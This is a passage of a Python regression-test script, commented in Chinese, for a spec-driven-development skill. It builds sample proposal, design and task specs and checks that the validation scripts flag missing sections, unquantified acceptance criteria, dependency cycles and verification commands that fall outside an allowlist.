#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SDD skill 回归测试 —— 校验 5 个脚本的行为。

自包含,不依赖 pytest:直接 `python tests/run_tests.py`。
每次改动 scripts/ 或 assets/templates/ 之后跑一遍。

覆盖:
  validate_specs.py     结构完整性、AC 可二值化、性能量化、DAG 无环、追溯闭合、delta 影响面、阶段判定
  verify_acceptance.py 验收报告与实际勾选状态是否一致
  update_claude_md.py  幂等性、多 feature 共存、不破坏用户原有内容
  export_openspec.py   导出结构与 GIVEN/WHEN/THEN 拆分
  init_specs.py        骨架生成与不覆盖已有文件
  sdd_bash_allow.py    PreToolUse hook 的放行判定(复合操作符、路径穿越、git 子命令)
  install_hook.py      hook 安装、不破坏已有 settings.json、幂等
"""

import io
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile

try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

HERE = os.path.dirname(os.path.abspath(__file__))
SKILL = os.path.normpath(os.path.join(HERE, '..', 'skills', 'sdd'))
SCRIPTS = os.path.join(SKILL, 'scripts')

PROPOSAL = """# 测试项目

<!-- SDD:SPEC:proposal -->

| 项目 | demo |
|------|------|
| 版本 | v0.5 |
| 状态 | 草稿 |
| 日期 | 2026-10-30 |
| 关联文档 | design.md, tasks.md |

## 1. 背景与目标

### 1.1 背景

现状手工处理,效率低。

### 1.2 目标

让客服能在一个地方可靠地管理每日任务。

### 1.3 目标用户

客服人员,单班次 10 人以内。

## 2. 功能范围

### 2.1 做什么（本期）

- 登录与鉴权
- 工单流转

### 2.2 不做什么（本期明确排除）

- 不做移动端原生应用,仅提供 Web 界面
- 不做多租户隔离
- 不做离线模式

### 2.3 技术约束（可选）

- 后端 Node.js,数据落 SQLite

## 3. 验收标准

### 3.1 功能验收

- **AC-F-001**: 给定一个已注册用户,当提交正确的密码时,系统 SHALL 返回 HTTP 200 并签发会话令牌 %(delta1)s
- **AC-F-002**: 给定一个已注册用户,当提交错误密码时,系统 SHALL 返回 HTTP 401 且不签发令牌

### 3.2 性能验收

- **AC-P-001**: 在 100 并发下,系统 SHALL 响应时间 < 200ms
- **AC-P-002**: 在 100 并发下,系统 SHALL 错误率 < 0.1%%

### 3.3 边界场景

- **AC-E-001**: 当请求体缺少 title 字段时,系统 SHALL 返回 HTTP 400 且响应体包含缺失字段名
- **AC-E-002**: 当并发更新同一条记录时,系统 SHALL 保证最终状态为其中之一且不出现部分字段更新

## 4. 术语定义

| 术语 | 定义 |
|------|------|
| 令牌 | 会话凭证 |

## 5. 开放问题与假设

- **ASM-001**: 假设单班次 10 人以内

## 6. 变更记录

| 日期 | 版本 | 变更 | 原因 | 影响 |
|------|------|------|------|------|
| 2026-10-30 | v0.1 | 完成 proposal 初稿 | — | — |
"""

DESIGN = """# 测试项目 — 架构设计

<!-- SDD:SPEC:design -->

| 项目 | demo |
|------|------|
| 版本 | v0.5 |
| 状态 | 草稿 |
| 日期 | 2026-10-30 |
| 关联文档 | proposal.md, tasks.md |

## 1. 系统架构

### 1.1 模块划分

| 模块 | 职责（做什么） | 不做什么 | 依赖 |
|------|--------------|----------|------|
| `ticket-domain` | 工单实体的字段定义、状态流转规则、业务校验 | 不负责 HTTP 协议解析;不负责数据库连接 | 无 |
| `ticket-store` | 工单数据的持久化与查询 | 不负责业务规则判断;不负责 HTTP 响应组装 | `ticket-domain` |
| `ticket-api` | HTTP 路由、请求体解析、响应组装与错误码映射 | 不直接操作数据库;不做业务规则判断 | `ticket-domain`, `ticket-store` |

### 1.2 数据流向

客户端 → `ticket-api` → `ticket-domain` → `ticket-store` → `ticket-api` → 客户端。

## 2. 技术选型 ADR

### ADR-001: 用 SQLite 作为本地持久化

- **状态**: 已采纳
- **背景**: 单用户本地应用,数据量千条以内,需要零运维持久化
- **选项**:
  - A. SQLite 嵌入式库 —— 零运维、支持事务;代价:并发写入能力有限
  - B. PostgreSQL 外部实例 —— 并发强;代价:需部署与账号管理
- **决策**: 选 A
- **理由**: 单用户场景下并发写限制不会成为瓶颈,而外部数据库的部署成本是持续的

## 3. 接口契约

### 3.1 数据模型

#### 实体: Ticket

| 字段 | 类型 | 语义 | 约束 |
|------|------|------|------|
| `id` | string | 工单唯一标识 | 全局唯一 |
| `title` | string | 工单标题 | 非空,长度 1 到 200 |
| `status` | string | 流转状态 | 枚举:待处理、处理中、已解决 |

### 3.2 模块接口签名

#### `ticket-domain.validate(input) -> Result`

- **语义**: 校验工单输入,返回通过或带字段级错误的失败结果
- **错误**: 不抛异常,失败以结构化错误列表返回
- **不变量**: 返回通过时 `title` 必然非空

#### `ticket-store.list(filter) -> Ticket[]`

- **语义**: 按状态筛选工单列表
- **错误**: 数据库不可用时抛出存储异常
- **不变量**: 返回记录的状态都在枚举内

## 4. 非功能性约束

### 4.1 性能

- 列表接口在 1000 条数据、并发 100 条件下 SHALL 保持 P95 小于 200ms(对应 AC-P-001)

### 4.2 安全

- **Key 管理**: 本期无外部 API Key,未来密钥只从环境变量读取,不落代码库
- **数据安全**: 工单内容视为用户私有数据,日志中不记录完整标题
- **访问控制**: 本期无账号体系,依赖本机访问边界

### 4.3 错误处理与优雅降级

- 数据库连接失败 → 返回 HTTP 503 并记录 ERROR 日志 → 不重试
- 请求体不可解析 → 返回 HTTP 400 → 记录 WARN 日志 → 不落库

### 4.4 可运维性

- **日志**: 结构化 JSON,含 level、path、requestId
- **健康检查**: `GET /healthz` 返回数据库连通状态
- **配置热更新**: 日志级别与端口号支持运行时重载

## 5. 依赖与假设

| 编号 | 假设 | 前提不成立时的退化方案 |
|------|------|------------------------|
| ASM-001 | 单班次 10 人以内,SQLite 并发写能力足够 | `ticket-store` 接口不变,内部实现替换为外部数据库 |

## 6. 追溯矩阵

| AC | 承接的设计条目 |
|----|----------------|
| AC-F-001 | §1.1 `ticket-domain` / §3.2 `ticket-domain.validate` |
| AC-F-002 | §1.1 `ticket-domain` / §3.2 `ticket-domain.validate` |
| AC-P-001 | §4.1 性能 / §3.2 `ticket-store.list` |
| AC-P-002 | §4.1 性能 / §3.2 `ticket-store.list` |
| AC-E-001 | §4.3 错误处理 / §3.2 `ticket-api.handle` |
| AC-E-002 | §1.1 `ticket-store` / §4.1 性能 |

## 7. 变更记录

| 日期 | 版本 | 变更 | 原因 | 影响 |
|------|------|------|------|------|
| 2026-10-30 | v0.5 | 完成 design 初稿 | — | — |
"""

TASKS = """# 测试项目 — 任务拆解

<!-- SDD:SPEC:tasks -->

| 项目 | demo |
|------|------|
| 版本 | v0.5 |
| 关联文档 | proposal.md, design.md |
| 任务总数 | 3 |
| 执行策略 | 按依赖顺序推进 |
| 批次 | M1 |

## 1. 任务列表

### [x] TASK-001: 实现工单领域模型与校验规则

- **描述**: 定义 Ticket 实体与状态流转规则,实现输入的字段级校验
- **输入**: 无
- **输出**: `src/domain/ticket.ts`
- **验收标准**: 空标题被拒绝并返回字段级错误列表
- **依赖**: 无
- **验证命令**: `pytest tests/domain/test_validate.py`
- **验证结果**: `pytest tests/domain/test_validate.py` → 8 passed

### [x] TASK-002: 实现工单存储与筛选查询

- **描述**: 基于 SQLite 实现工单持久化,支持按状态筛选
- **输入**: TASK-001 的实体定义
- **输出**: `src/store/ticket-store.ts`
- **验收标准**: 写入后可读出,筛选结果只含符合条件的记录
- **依赖**: TASK-001
- **验证命令**: `pytest tests/store/test_ticket_store.py`
- **验证结果**: `pytest tests/store/test_ticket_store.py` → 5 passed

### [x] TASK-003: 实现工单 HTTP 接口与错误码映射

- **描述**: 实现 REST 端点、请求体解析与错误码映射
- **输入**: TASK-001 的校验函数与 TASK-002 的存储接口
- **输出**: `src/api/ticket-api.ts`
- **验收标准**: 空标题返回 422,缺少字段返回 400,列表返回 200
- **依赖**: TASK-001, TASK-002
- **验证命令**: `pytest tests/api/test_ticket_api.py`
- **验证结果**: `pytest tests/api/test_ticket_api.py` → 11 passed

## 2. 依赖关系图

```mermaid
graph TD
  TASK-001 --> TASK-002
  TASK-001 --> TASK-003
  TASK-002 --> TASK-003
```

## 3. 推荐执行顺序

```
批次 1: TASK-001
批次 2: TASK-002
批次 3: TASK-003
```

## 4. 追溯矩阵

| AC | 覆盖的 Task |
|----|-------------|
| AC-F-001 | TASK-001, TASK-003 |
| AC-F-002 | TASK-001, TASK-003 |
| AC-P-001 | TASK-002 |
| AC-P-002 | TASK-002 |
| AC-E-001 | TASK-003 |
| AC-E-002 | TASK-002 |

## 5. 变更记录

| 日期 | 版本 | 变更 | 原因 | 影响 |
|------|------|------|------|------|
| 2026-10-30 | v0.5 | 完成 tasks 初稿 | — | — |
"""

REPORT = """# 测试项目 — 验收报告

<!-- SDD:SPEC:acceptance -->

| 项目 | demo |
|------|------|
| 版本 | v1.0 |
| 验收日期 | 2026-10-30 |
| 关联文档 | proposal.md, design.md, tasks.md |

## 1. 结论

通过 —— 6 条验收标准全部实测达标。

## 2. 功能验收:AC 回放矩阵

| AC | 描述 | 覆盖 Task | 测试用例 | 结果 |
|----|------|-----------|----------|------|
| AC-F-001 | 正确密码登录 | TASK-001, TASK-003 | `test_validate.py::test_ok` | ✅ 通过 |
| AC-F-002 | 错误密码登录 | TASK-001, TASK-003 | `test_validate.py::test_bad` | ✅ 通过 |
| AC-P-001 | P95 < 200ms | TASK-002 | `bench.py` | ✅ 通过 |
| AC-P-002 | 错误率 < 0.1% | TASK-002 | `bench.py` | ✅ 通过 |
| AC-E-001 | 缺字段返回 400 | TASK-003 | `test_ticket_api.py::test_missing` | ✅ 通过 |
| AC-E-002 | 并发更新不撕裂 | TASK-002 | `test_store.py::test_concurrent` | ✅ 通过 |

**通过数 / 总数**: 6 / 6

## 3. 接口一致性

| 接口 | design 契约 | 实际实现 | 结论 |
|------|------------|----------|------|
| `ticket-domain.validate` | 返回结构化错误列表 | 一致 | ✅ 一致 |

## 4. 架构一致性

| 检查项 | 期望 | 实际 | 结论 |
|--------|------|------|------|
| 模块边界 | ticket-store 不做业务判断 | 未越界 | ✅ |
| 职责不被突破 | ticket-api 不直接操作数据库 | 未突破 | ✅ |
| ADR 决策被遵守 | 用 SQLite | 用了 SQLite | ✅ |
| 依赖方向正确 | 依赖向下 | 正确 | ✅ |

## 5. 性能实测

| 指标 | 对应 AC | 目标 | 实测 | 结论 |
|------|----------|------|------|------|
| 列表接口 P95 | AC-P-001 | 小于 200ms | 143ms | ✅ |
| 错误率 | AC-P-002 | 小于 0.1% | 0.02% | ✅ |

## 6. 遗留问题

| 编号 | 问题 | 影响 | 严重度 | 后续 |
|------|------|------|--------|------|
| ISS-001 | 无 | 无 | 低 | 无 |

## 7. 交付物清单

- [x] proposal.md / design.md / tasks.md 已提交
- [x] 全部 Task 已勾选
- [x] 验收报告已提交
- [x] 已打 tag `v1.0`
"""

FILES = {'proposal.md': PROPOSAL % {'delta1': ''}, 'design.md': DESIGN,
         'tasks.md': TASKS, 'acceptance-report.md': REPORT}

PASSED, FAILED = [], []

# ---- as-is(现状逆向)场景夹具:照 brownfield 存量系统的形态造 ----

ASIS_PROPOSAL = """# 测试项目 — 现状规范

<!-- SDD:SPEC:proposal -->

## 0. 元信息

| 项目 | demo |
|------|------|
| 版本 | v0.5 |
| 状态 | 草稿 |
| 日期 | 2026-11-08 |
| 关联文档 | design.md, tasks.md |

## 1. 背景与目标

### 1.1 背景

系统已上线运行,行为契约目前只存在于代码注释与历史提交记录里。

### 1.2 目标

**系统层**：让提问者拿到一份**带可核对引用**的答案——引用编号与来源列表一致,检索无结果时
给出明确拒绝而不是编造。

**规范层**：把这些行为固化成可评审、可追溯的契约,使得未参与过开发的开发者或 AI 会话
仅凭本规范即可准确复述现状行为契约。

### 1.3 目标用户

**使用系统的人**：内部客服人员,单班次 10 人以内。

**读这份规范的人**：维护该链路的开发者、评审者、后续会话的 AI 编码代理。

## 2. 功能范围

### 2.1 做什么（本期）

- 本期覆盖的行为契约包括:意图分类与路由决策链、引用编号一致性、异常降级与拒绝契约、边界输入行为

### 2.2 不做什么（本期明确排除）

- 不修改任何生产代码。本期产出物只有规范文档,§6 列出的缺口只记录不动手
- 不重建向量库 schema,只描述其对外可观测行为
- 不提出改造方案,§6 的缺口清单只陈述事实与影响

### 2.3 技术约束

- Python 3.11+,自研异步状态机
- 事实来源限定为源码、现有 pytest 断言、固定评测集期望值与历史提交记录
- 采信规则：当 README、代码注释、类型注解或配置示例与实际实现冲突时,本规范一律采信实现

## 3. 验收标准

### 3.1 功能验收

- **AC-F-001**: 给定一次成功回答,答案内来源编号顺序与 wire 事件 sources 的 index 顺序 SHALL 来自同一份有序清单
- **AC-F-002**: 给定校验器判定答案不一致且修复预算未耗尽,系统 SHALL 把修复指令注入合成提示并重新合成

### 3.2 性能验收

- **AC-P-001**: 在 100 并发下,列表接口响应时间 SHALL 小于 200ms
- **AC-P-002**: 给定探针重排分,系统 SHALL 进入真实检索路径,门限为当前生效的相关度门限（默认 0.05,可用 RAG_MIN_TOP_RELEVANCE_SCORE 覆盖）

### 3.3 边界场景

- **AC-E-001**: 当请求体缺少 title 字段时,系统 SHALL 返回 HTTP 400 且响应体包含缺失字段名

## 4. 术语定义

| 术语 | 定义 |
|------|------|
| 门限 | 决定是否进入真实检索的相关度下限 |

## 5. 假设与开放问题

- **ASM-001**: 本规范基于对源码的静态审查,未运行代码;所有行为断言均为静态判定
- **OQ-001**: 某 wire 事件前端未消费,是有意还是待补?需产品侧拍板

## 6. 现状缺口清单

| # | 现状事实 | 位置 | 文档侧失真 | 影响 |
|---|---------|------|-----------|------|
| 1 | 相关度门限为 0.05 | config/constants.py:211 | README 写 0.3 | 调参误导 |

## 7. 变更记录

| 日期 | 版本 | 变更 | 原因 | 影响 |
|------|------|------|------|------|
| 2026-11-08 | v0.5 | 完成现状规范初稿 | 存量系统补写规范 | 确立行为契约基线 |
"""

ASIS_DESIGN = """# 测试项目 — 架构设计

<!-- SDD:SPEC:design -->

## 0. 元信息

| 项目 | demo |
|------|------|
| 版本 | v0.5 |
| 状态 | 草稿 |
| 日期 | 2026-11-08 |
| 关联文档 | proposal.md, tasks.md |

## 1. 系统架构

### 1.1 模块划分

| 模块 | 职责（做什么） | 不做什么 | 依赖 |
|------|--------------|----------|------|
| `query-pipeline` | 意图分类、路由决策与呈现决策 | 不负责 HTTP 协议解析;不负责检索实现 | 无 |
| `retrieval` | 文档检索、相关度门限判定与重排 | 不负责意图分类;不负责答案合成 | `query-pipeline` |
| `synthesis` | 答案合成、引用整理与幻觉校验 | 不负责检索;不负责用户可见文案 | `query-pipeline` |

### 1.2 数据流向

客户端 → `query-pipeline` → `retrieval` → `synthesis` → 客户端。

## 2. 技术选型 ADR

### ADR-003: 相关度门限采用重排交叉编码器分数

- **状态**: 已采纳
- **背景**: 早期门限取快速评分分数的 0.3,换用重排分数后从未重新标定
- **选项**:
  - A. 保持 0.3 —— 代价:大量真阳性被当成无结果
  - B. 取 0.05 —— 代价:门槛偏低,需靠重排分数分布保证
- **决策**: 选 B,并保留环境变量覆盖以便按语料调整
- **理由**: 门限必须按当前分数的实测分布标定,不能沿用上一代分数的遗产
- **对应 AC**: AC-P-002

### ADR-004: 引用编号采用一份清单同一顺序

- **状态**: 已采纳
- **背景**: 引用编号在答案正文与来源数组两处独立生成,曾出现不一致
- **选项**:
  - A. 各自生成 —— 代价:两处可能不一致
  - B. 同一份有序清单重映射 —— 代价:需要一次重编号
- **决策**: 选 B
- **理由**: 单一来源消除了不一致的可能
- **对应 AC**: AC-F-001

### ADR-005: 校验反馈闭环

- **状态**: 已采纳
- **背景**: 校验不一致时若不复核,用户可能看到编造答案
- **选项**:
  - A. 校验后不修复 —— 代价:不一致答案直接上线
  - B. 注入修复指令并重新合成 —— 代价:增加一轮模型调用
- **决策**: 选 B
- **理由**: 不一致答案对用户的危害大于一轮额外开销
- **对应 AC**: AC-F-002

## 3. 接口契约

### 3.1 数据模型

#### 实体: Answer

| 字段 | 类型 | 语义 | 约束 |
|------|------|------|------|
| `text` | string | 答案正文 | 非空 |
| `sources` | list | 有序来源清单 | 与引用编号同源 |

### 3.2 模块接口签名

#### `retrieval.search(query, thread_id) -> Result`

- **语义**: 按线程作用域检索文档
- **错误**: 线程标识非法时抛出线程必需异常
- **不变量**: 返回记录的来源类别都在枚举内

## 4. 非功能性约束

### 4.1 性能

- 列表接口在 100 并发下 SHALL 保持 P95 小于 200ms（对应 AC-P-001）
- 相关度门限默认 0.05,可用 `RAG_MIN_TOP_RELEVANCE_SCORE` 覆盖

### 4.2 安全

- **Key 管理**: 密钥只从环境变量读取,不落代码库
- **数据安全**: 文档内容视为用户私有数据,日志不记录完整正文
- **访问控制**: 检索强制按线程过滤,空线程标识是全局哨兵例外

### 4.3 错误处理与优雅降级

- 检索失败 → 返回空检索状态并给出拒绝文案 → 记录 WARN 日志

### 4.4 可运维性

- **日志**: 结构化 JSON,含 level、path、requestId
- **健康检查**: `GET /healthz` 返回依赖连通状态
- **配置热更新**: 相关度门限支持环境变量覆盖,无需重启

## 5. 依赖与假设

| 编号 | 假设 | 前提不成立时的退化方案 |
|------|------|------------------------|
| ASM-001 | 行为断言基于静态审查 | 若实测冲突,以实测为准并按逆向修改流程更新本规范 |
| OQ-001 | 前端是否消费该 wire 事件待定 | 未定前按现状固化 |

## 6. 追溯矩阵

| AC | 承接的设计条目 |
|----|----------------|
| AC-F-001 | §2 ADR-004 / §3.1 实体 Answer |
| AC-F-002 | §2 ADR-005 |
| AC-P-001 | §4.1 性能 |
| AC-P-002 | §2 ADR-003 / §4.1 性能 |
| AC-E-001 | §4.3 错误处理 |

## 7. 变更记录

| 日期 | 版本 | 变更 | 原因 | 影响 |
|------|------|------|------|------|
| 2026-11-08 | v0.5 | 完成 design 初稿 | — | — |
"""

ASIS_TASKS = """# 测试项目 — 任务拆解

<!-- SDD:SPEC:tasks -->

## 0. 元信息

| 项目 | demo |
|------|------|
| 版本 | v0.5 |
| 关联文档 | proposal.md, design.md |
| 任务总数 | 3 |
| 执行策略 | 串行,每个 Task 产出规范描述与核对证据 |
| 批次 | M1 |

## 1. 任务列表

### [x] TASK-001: 核对路由决策与引用编号契约

- **描述**: 核对意图分类、路由决策链与引用编号一致性
- **输入**: 无
- **输出**: proposal §3 对应条目与核对证据
- **验收标准**: 三条 AC 均有源码或测试支撑点
- **依赖**: 无
- **验证命令**: `pytest tests/contract/test_routing.py`
- **验证结果**: `pytest tests/contract/test_routing.py` → 6 passed

### [x] TASK-002: 核对校验闭环与降级拒绝契约

- **描述**: 核对答案校验反馈闭环与失败降级路径
- **输入**: 无
- **输出**: proposal §3 对应条目与核对证据
- **验收标准**: 两条 AC 均有源码或测试支撑点
- **依赖**: 无
- **验证命令**: `pytest tests/contract/test_verify.py`
- **验证结果**: `pytest tests/contract/test_verify.py` → 4 passed

### [x] TASK-003: 核对性能预算与边界输入契约

- **描述**: 核对性能预算、门限覆盖方式与边界输入拒绝
- **输入**: 无
- **输出**: proposal §3 对应条目与核对证据
- **验收标准**: 三条 AC 均有源码或测试支撑点
- **依赖**: 无
- **验证命令**: `pytest tests/contract/test_limits.py`
- **验证结果**: `pytest tests/contract/test_limits.py` → 3 passed

## 2. 依赖关系图

```mermaid
graph TD
  TASK-001[核对路由决策与引用编号契约]
  TASK-002[核对校验闭环与降级拒绝契约]
  TASK-003[核对性能预算与边界输入契约]
```

## 3. 推荐执行顺序

```
批次 1 (可并行 [P]): TASK-001, TASK-002, TASK-003
```

## 4. 追溯矩阵

| AC | 覆盖的 Task |
|----|-------------|
| AC-F-001 | TASK-001 |
| AC-F-002 | TASK-002 |
| AC-P-001 | TASK-003 |
| AC-P-002 | TASK-003 |
| AC-E-001 | TASK-003 |

## 5. 变更记录

| 日期 | 版本 | 变更 | 原因 | 影响 |
|------|------|------|------|------|
| 2026-11-08 | v0.5 | 完成 tasks 初稿 | — | — |
"""

ASIS_FILES = {'proposal.md': ASIS_PROPOSAL, 'design.md': ASIS_DESIGN,
              'tasks.md': ASIS_TASKS}


def check(label, condition, detail=''):
    if condition:
        PASSED.append(label)
        print('  [OK ] %s' % label)
    else:
        FAILED.append(label)
        print('  [!! ] %s %s' % (label, detail))


def run(script, *args):
    p = subprocess.run([sys.executable, os.path.join(SCRIPTS, script)] + list(args),
                       capture_output=True, text=True, encoding='utf-8')
    return p.returncode, (p.stdout or '') + (p.stderr or '')


def run_hook(payload, hook_path=None, env=None):
    """像 harness 那样喂一份 JSON 给 hook,返回 (stdout 字节, stderr 文本)。"""
    path = hook_path or os.path.join(SKILL, 'hooks', 'sdd_bash_allow.py')
    environ = dict(os.environ)
    environ.update(env or {})
    proc = subprocess.run([sys.executable, path],
                          input=json.dumps(payload).encode('utf-8'),
                          capture_output=True, env=environ, timeout=60)
    return proc.stdout, (proc.stderr or b'').decode('utf-8', 'replace')


def make_project(base, feature='demo', files=None):
    d = os.path.join(base, 'specs', feature)
    os.makedirs(d, exist_ok=True)
    for name, content in (files if files is not None else FILES).items():
        io.open(os.path.join(d, name), 'w', encoding='utf-8', newline='\n').write(content)
    return d


def mutate(path, old, new, count=1):
    text = io.open(path, encoding='utf-8').read()
    if old not in text:
        raise AssertionError('变异目标未找到: %r' % old[:60])
    io.open(path, 'w', encoding='utf-8', newline='').write(text.replace(old, new, count))


def test_validate_specs(tmp):
    print('\n=== validate_specs.py ===')
    base = os.path.join(tmp, 'v1')
    make_project(base)
    code, out = run('validate_specs.py', '--feature', 'demo', '--root', base)
    check('完整合规的规范通过校验', code == 0, out[-400:])

    # 空模板:曾因模板注释里的示例 AC 被当成真条目而误报「编号重复」
    base = os.path.join(tmp, 'v2')
    os.makedirs(base)
    run('init_specs.py', 'demo', '--root', base)
    code, out = run('validate_specs.py', '--feature', 'demo', '--root', base)
    check('空模板报未填占位符', code != 0 and '占位符' in out)
    check('空模板不误报「编号重复」(模板注释里的示例 AC 不是真条目)',
          '编号重复' not in out, out[-400:])

    base = os.path.join(tmp, 'v3')
    d = make_project(base)
    mutate(os.path.join(d, 'proposal.md'),
           '- 不做离线模式\n', '')
    code, out = run('validate_specs.py', '--feature', 'demo', '--root', base)
    check('「不做什么」少于 3 条时报错', code != 0 and '不做什么' in out)

    base = os.path.join(tmp, 'v4')
    d = make_project(base)
    mutate(os.path.join(d, 'proposal.md'),
           '在 100 并发下,系统 SHALL 响应时间 < 200ms', '在 100 并发下,系统 SHALL 响应时间足够快')
    code, out = run('validate_specs.py', '--feature', 'demo', '--root', base)
    check('性能 AC 未量化时报错', code != 0 and '量化' in out)

    base = os.path.join(tmp, 'v5')
    d = make_project(base)
    mutate(os.path.join(d, 'proposal.md'),
           '系统 SHALL 返回 HTTP 200 并签发会话令牌', '系统 SHALL 表现良好')
    code, out = run('validate_specs.py', '--feature', 'demo', '--root', base)
    check('AC 期望结果模糊时报错', code != 0 and '不可观测' in out)

    base = os.path.join(tmp, 'v6')
    d = make_project(base)
    mutate(os.path.join(d, 'proposal.md'),
           '系统 SHALL 返回 HTTP 200 并签发会话令牌',
           '系统 SHALL 校验通过并签发会话令牌')
    code, out = run('validate_specs.py', '--feature', 'demo', '--root', base)
    check('措辞不常见但可二值判定的 AC 不误报', code == 0, out[-400:])

    base = os.path.join(tmp, 'v7')
    d = make_project(base)
    mutate(os.path.join(d, 'tasks.md'),
           '- **依赖**: TASK-001\n- **验证命令**: `pytest tests/store/test_ticket_store.py`',
           '- **依赖**: TASK-003\n- **验证命令**: `pytest tests/store/test_ticket_store.py`')
    code, out = run('validate_specs.py', '--feature', 'demo', '--root', base)
    check('任务依赖成环时报错', code != 0 and '环' in out)

    base = os.path.join(tmp, 'v8')
    d = make_project(base)
    mutate(os.path.join(d, 'tasks.md'),
           '- **验证命令**: `pytest tests/store/test_ticket_store.py`\n', '')
    code, out = run('validate_specs.py', '--feature', 'demo', '--root', base)
    check('Task 缺验证命令时报错', code != 0 and '验证命令' in out)

    # --- auto 模式可跑性:验证命令必须能进白名单 ---
    # (auto 模式的判定在服务端,代理端点不透传 → 不可达;本地只剩 hook 能放行。
    #  所以「这条命令能不能跑」要在规范阶段就查出来,别等 Phase 4 撞墙。)
    base = os.path.join(tmp, 'v_auto1')
    d = make_project(base)
    mutate(os.path.join(d, 'tasks.md'),
           '- **验证命令**: `pytest tests/store/test_ticket_store.py`',
           '- **验证命令**: `npx vitest run tests/e2e/x.test.ts`')
    code, out = run('validate_specs.py', '--feature', 'demo', '--root', base)
    check('验证命令在 auto 模式下跑不了时报错',
          code != 0 and 'auto 模式' in out, out[-300:])

    base = os.path.join(tmp, 'v_auto2')
    d = make_project(base)
    mutate(os.path.join(d, 'tasks.md'),
           '- **验证命令**: `pytest tests/store/test_ticket_store.py`',
           '- **验证命令**: `cd app && npm test`')
    code, out = run('validate_specs.py', '--feature', 'demo', '--root', base)
    check('能进白名单的复合验证命令不报错', code == 0, out[-300:])

    base = os.path.join(tmp, 'v_auto3')
    d = make_project(base)
    mutate(os.path.join(d, 'tasks.md'),
           '- **验证命令**: `pytest tests/store/test_ticket_store.py`',
           '- **验证命令**: `cd app && npm test` 与 `cd app && npm run build`')
    code, out = run('validate_specs.py', '--feature', 'demo', '--root', base)
    check('多条验证命令(markdown 代码段)不误报命令替换', code == 0, out[-300:])

    # 「常用命令」小节里的命令也要能在 auto 模式下跑
    base = os.path.join(tmp, 'v_auto4')
    d = make_project(base)
    with io.open(os.path.join(d, 'tasks.md'), 'a', encoding='utf-8',
                 newline='\n') as fh:
        fh.write('\n## 常用命令\n\n- `npx vitest run tests/e2e/x.test.ts`\n')
    code, out = run('validate_specs.py', '--feature', 'demo', '--root', base)
    check('常用命令在 auto 模式下跑不了时报错',
          code != 0 and 'auto 模式' in out, out[-300:])

    base = os.path.join(tmp, 'v9')
    d = make_project(base)
    mutate(os.path.join(d, 'tasks.md'),
           '### [x] TASK-002: 实现工单存储与筛选查询',
           '### [x] TASK-002: 工单存储与筛选查询')
    code, out = run('validate_specs.py', '--feature', 'demo', '--root', base)
    check('Task 标题非动词开头时报错', code != 0 and '动词' in out)

    base = os.path.join(tmp, 'v10')
    d = make_project(base)
    mutate(os.path.join(d, 'design.md'),
           '| 模块 | 职责（做什么） | 不做什么 | 依赖 |', '| 模块 | 职责（做什么） | 依赖 |')
    code, out = run('validate_specs.py', '--feature', 'demo', '--root', base)
    check('模块表缺「不做什么」列时报错', code != 0 and '不做什么' in out)

    base = os.path.join(tmp, 'v11')
    d = make_project(base)
    mutate(os.path.join(d, 'design.md'),
           '- **理由**: 单用户场景下并发写限制不会成为瓶颈,而外部数据库的部署成本是持续的\n', '')
    code, out = run('validate_specs.py', '--feature', 'demo', '--root', base)
    check('ADR 缺「理由」时报错', code != 0 and '理由' in out)

    base = os.path.join(tmp, 'v12')
    d = make_project(base)
    mutate(os.path.join(d, 'tasks.md'),
           '## 4. 追溯矩阵\n\n| AC | 覆盖的 Task |\n|----|-------------|\n'
           '| AC-F-001 | TASK-001, TASK-003 |\n| AC-F-002 | TASK-001, TASK-003 |\n'
           '| AC-P-001 | TASK-002 |\n| AC-P-002 | TASK-002 |\n'
           '| AC-E-001 | TASK-003 |\n| AC-E-002 | TASK-002 |\n', '')
    code, out = run('validate_specs.py', '--feature', 'demo', '--root', base)
    check('tasks 缺 §4 追溯矩阵时报错', code != 0 and '追溯矩阵' in out)

    base = os.path.join(tmp, 'v13')
    d = make_project(base)
    mutate(os.path.join(d, 'tasks.md'),
           '- **验证结果**: `pytest tests/domain/test_validate.py` → 8 passed\n', '')
    code, out = run('validate_specs.py', '--feature', 'demo', '--root', base)
    check('已勾选 Task 缺验证结果时报错', code != 0 and '验证结果' in out)

    base = os.path.join(tmp, 'v14')
    d = make_project(base, files=dict(FILES, **{'proposal.md': PROPOSAL % {'delta1': '<!-- MODIFIED -->'}}))
    code, out = run('validate_specs.py', '--feature', 'demo', '--root', base)
    check('MODIFIED 的 AC 给出下游影响提示', code == 0 and '下游需复核' in out, out[-400:])

    base = os.path.join(tmp, 'v15')
    d = make_project(base, files=dict(FILES, **{'proposal.md': PROPOSAL % {'delta1': '<!-- ADDED -->'}}))
    mutate(os.path.join(d, 'tasks.md'), '| AC-F-001 | TASK-001, TASK-003 |', '')
    code, out = run('validate_specs.py', '--feature', 'demo', '--root', base)
    check('ADDED 的 AC 未落到 Task 时报错', code != 0 and 'ADDED' in out)

    base = os.path.join(tmp, 'v16')
    os.makedirs(base)
    run('init_specs.py', 'demo', '--root', base)
    code, out = run('validate_specs.py', '--feature', 'demo', '--root', base, '--phase')
    check('空模板的阶段判定是 Phase 1(不因文件存在就跳到 Phase 4)',
          'Phase 1' in out, out[:300])

    base = os.path.join(tmp, 'v17')
    make_project(base)
    code, out = run('validate_specs.py', '--feature', 'demo', '--root', base, '--phase')
    check('三份规范齐备且 Task 全勾选的阶段判定是 Phase 5',
          'Phase 5' in out, out[:300])

    base = os.path.join(tmp, 'v18')
    d = make_project(base)
    for tid in ('TASK-001', 'TASK-002', 'TASK-003'):
        mutate(os.path.join(d, 'tasks.md'), '### [x] %s:' % tid, '### %s:' % tid)
    code, out = run('validate_specs.py', '--feature', 'demo', '--root', base, '--phase')
    check('三份规范齐备但 Task 未完成的阶段判定是 Phase 4',
          'Phase 4' in out, out[:300])


def test_verify_acceptance(tmp):
    print('\n=== verify_acceptance.py ===')
    base = os.path.join(tmp, 'a1')
    make_project(base)
    code, out = run('verify_acceptance.py', '--feature', 'demo', '--root', base)
    check('完整合规的验收报告通过', code == 0, out[-400:])

    base = os.path.join(tmp, 'a2')
    d = make_project(base)
    mutate(os.path.join(d, 'acceptance-report.md'),
           '| AC-F-002 | 错误密码登录 | TASK-001, TASK-003 | `test_validate.py::test_bad` | ✅ 通过 |',
           '| AC-F-002 | 错误密码登录 | TASK-001, TASK-003 | `test_validate.py::test_bad` | ❌ 未通过 |')
